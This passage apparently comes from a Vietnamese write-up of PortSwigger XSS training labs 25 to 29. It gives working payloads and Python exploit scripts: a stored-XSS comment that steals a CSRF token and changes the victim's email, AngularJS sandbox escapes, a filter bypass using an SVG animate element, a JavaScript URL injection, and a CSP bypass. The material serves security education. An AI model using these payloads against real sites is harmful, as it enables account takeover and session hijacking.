soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input', {'name' : 'csrf'})['value']

payload = """<script>
var request = new XMLHttpRequest();
request.onload = csrfEmail;
request.open('get','/my-account',true);
request.send();
function csrfEmail() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/my-account/change-email', true);
    changeReq.send('email=cuong@gmail.com&csrf='+token)
};
</script>""";

data = {
    'comment': payload,
    'postId': '8',
    'name': 'cuong',
    'email': 'a@a.a',
    'website' : 'http://a.com',
    'csrf' : csrf,
}

response = session.post(
    url + "/post/comment",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/Sk-cyq_9T.png)

## 25. Lab: Reflected XSS with AngularJS sandbox escape without strings

link: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings

### Phân tích

- mình serarch và thấy đoạn script xử lí

![image](https://hackmd.io/_uploads/S1GAu5u5a.png)

### Khai thác

chúng ta sẽ dùng payload để bypass

```
/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

trên XSS cheatsheet

![image](https://hackmd.io/_uploads/HksnjqO5p.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ace00d804ba6e09805b2b3800ca00cf.web-security-academy.net'

response = requests.get(
    url + "/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/By8u3c_9a.png)

![image](https://hackmd.io/_uploads/S1EY3qdqp.png)

## 26. Lab: Reflected XSS with AngularJS sandbox escape and CSP

link: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp

### Đề bài

![image](https://hackmd.io/_uploads/BJgcTqOca.png)

### Khai thác

payload

```javascript
<script>
  location='https://0ae000e203a4368980d7765c00c000e8.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

![image](https://hackmd.io/_uploads/SJ0xAquqa.png)

store và gửi cho victim

![image](https://hackmd.io/_uploads/HyBE0qOcT.png)

## 27. Lab: Reflected XSS with event handlers and href attributes blocked

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

### Đề bài

![image](https://hackmd.io/_uploads/H1S205u9a.png)

### Phân tích

- chúng ta cần tạo 1 nút click và khi victim click vào sẽ alert
  mình thử xem các thẻ nào không bị filter

![image](https://hackmd.io/_uploads/Sy5AMiO5T.png)

![image](https://hackmd.io/_uploads/SkU8Qouq6.png)

và chỉ có 5 thẻ không bị filter

### Khai thác

mình dùng payload

```javascript
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a1a00290310105f805517fc002400ae.web-security-academy.net'

payload = "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>"
response = requests.get(
    url + "/?search=" + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Byq1gjO5a.png)

![image](https://hackmd.io/_uploads/rkQGgo_qp.png)

## 28. Lab: Reflected XSS in a JavaScript URL with some characters blocked

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

### Đề bài

![image](https://hackmd.io/_uploads/SJzO4pu56.png)

### Phân tích

- Lab này phản ánh thông tin đầu vào của bạn trong một URL JavaScript, nhưng tất cả không như vẻ ngoài của nó. Điều này ban đầu có vẻ như là một thử thách tầm thường; tuy nhiên, ứng dụng đang chặn một số ký tự nhằm ngăn chặn các cuộc tấn công XSS.
- Để giải quyết bài lab, hãy thực hiện một cuộc tấn công bằng XSS gọi alert bằng chuỗi 1337chứa ở đâu đó trong alert thông báo.

mình vào 1 bài post và để ý đường dẫn quay lại khác so với các bài trước

![image](https://hackmd.io/_uploads/Bko2LTd9p.png)

mình gi thêm tham số trên url và thấy nó được thêm vào trong đoạn script xử lý để fetch trước khi về trang chủ

`view-source:https://0a430091039f899c807e4980001f0062.web-security-academy.net/post?postId=4&123456`

![image](https://hackmd.io/_uploads/rJJ6_pd96.png)

vậy mình sẽ cố gắng bypass và ngắt lệnh và thực hiện lệnh script mà mình muốn

### Khai thác

payload mình dùng và thêm vào trên url

```
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

sau khi nhấn back to blog chúng ta được

![image](https://hackmd.io/_uploads/BkKoqTucp.png)

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a430091039f899c807e4980001f0062.web-security-academy.net'

payload = "&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'"
response = requests.get(
    url + "/post?postId=4" + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/BJRlcaO5a.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/rJkMcTdqa.png)

## 29. Lab: Reflected XSS protected by CSP, with CSP bypass

link: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass

### Đề bài

![image](https://hackmd.io/_uploads/Bk6J2Tu5T.png)

### Phân tích

- Content Security Policy (CSP) là một tính năng bảo mật web cho phép người quản trị trang web định cấu hình các nguồn tài nguyên cho phép tải và sử dụng trên trang web đó. Điều này có thể giúp ngăn chặn các cuộc tấn công XSS bằng cách không cho phép tài nguyên không đáng tin cậy được tải và sử dụng trên trang web.
- Một ví dụ khác cho phép tải tài nguyên từ cùng một nguồn (self) như trước, nhưng cũng cho phép tải JavaScript từ `https://trustedscripts.example.com`, hình ảnh từ `https://trustedimages.example.com` và CSS từ `https://trustedstyles.example.com`. Tất cả các nguồn khác sẽ bị cấm.
- CSP, hay Content Security Policy, là một bộ các chính sách an ninh được triển khai trên trang web để ngăn chặn các loại tấn công như Cross-Site Scripting (XSS). CSP giúp giảm nguy cơ của XSS bằng cách giới hạn hoặc ngăn chặn việc thực thi mã JavaScript không an toàn từ nguồn không tin cậy.
- mình nhập `<img src=1 onerror=alert(1)>`

![image](https://hackmd.io/_uploads/S1lw2Tdqp.png)

Quan sát thấy tải trọng được phản ánh nhưng CSP ( Content Security Policy) ngăn không cho tập lệnh thực thi.

![image](https://hackmd.io/_uploads/BkLT6aO5T.png)

- phản hồi có chứa `Content-Security-Policy` tiêu đề và `report-uri` lệnh chứa tham số có tên token. Vì mình có thể kiểm soát token tham số nên bạn có thể đưa các chỉ thị CSP của riêng mình vào chính sách.

![image](https://hackmd.io/_uploads/ryiBRT_qa.png)

kiểm tra CSP tại https://csp-evaluator.withgoogle.com/ cho kết quả an toàn:

![image](https://hackmd.io/_uploads/ByWRKR_56.png)

Việc tiêm sử dụng `script-src-elem` trong CSP. Lệnh này cho phép mình chỉ nhắm mục tiêu script các phần tử. Bằng cách sử dụng lệnh này, mình có thể ghi đè `script-src` các quy tắc hiện có cho phép mình chèn `unsafe-inline`, điều này cho phép mình sử dụng các tập lệnh inline scripts, có nghĩa là JavaScript được phép viết trực tiếp trong mã HTML của trang web, thay vì được tải từ một tệp riêng biệt

### Khai thác

mình dùng payload sau

```javascript
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a9700ba049c65728084c66c00cf00f4.web-security-academy.net'

payload = "<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'"
response = requests.get(
    url + "/?search=" + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/BkrhjadcT.png)
